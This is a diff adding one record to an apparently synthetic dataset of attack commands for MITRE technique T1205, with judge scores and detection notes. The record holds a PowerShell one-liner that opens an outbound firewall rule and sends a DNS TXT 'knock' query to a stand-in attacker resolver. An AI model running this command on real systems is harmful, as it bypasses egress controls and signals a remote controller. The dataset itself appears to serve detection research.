@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "& netsh advfirewall firewall add rule name='DNS-Signal-UDP53' dir=out action=allow protocol=UDP remoteport=53 remoteip=203.0.113.10 >$null;nslookup -type=TXT _knock.signal.attacker.tld 203.0.113.10 >$null",
+  "explanation": "Signals to a remote controller using a DNS TXT query (to 203.0.113.10), which can be used by the adversary as a magic packet trigger. A firewall rule via netsh ensures outbound DNS to that resolver is allowed. No obfuscation is used.",
+  "rationale_steps": [
+    "Permit outbound UDP/53 to a specific resolver using netsh to avoid egress controls.",
+    "Send a DNS TXT request with a known magic label that the remote monitors as a trigger.",
+    "Detection: monitor non-standard resolvers per host, outbound DNS to unusual IPs, and process lineage showing nslookup invoked by PowerShell."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-3c835ea5-f1ab4096",
+  "source_prompt_hash": "3c835ea5",
+  "timestamp_utc": "2025-09-30T05:43:16.300607Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Valid PowerShell one-liner with proper use of the call operator, semicolon separator, balanced quoting, valid flags, and supported redirection to $null.",
+        "semantic_score": 4,
+        "semantic_justification": "The nslookup TXT query to a specified DNS server constitutes traffic signaling (T1205), but adding the firewall rule via netsh typically requires elevation, so the 'ensure allowed' part may fail under non-admin privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T14:47:45.496631Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is well-formed PowerShell with valid semicolon separation, balanced quotes, and correct flag usage, though the leading '& ' before netsh is unnecessary (netsh is not a script block) and slightly unconventional, but it is still parseable and executable.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 Traffic Signaling by using a DNS TXT query to a specific attacker-controlled resolver as a magic-packet-style trigger, and the netsh firewall rule correctly ensures the outbound UDP/53 traffic to that IP is permitted, making the full operational flow realistic and well-aligned with the technique description.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2026-02-19T03:49:20.449026Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses proper PowerShell syntax, including the call operator, correct command separators, and valid netsh/nslookup arguments.",
+        "semantic_score": 4,
+        "semantic_justification": "While the DNS lookup accurately implements traffic signaling, the netsh command requires administrative privileges, contradicting the provided 'None' privilege level.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T03:49:22.802939Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
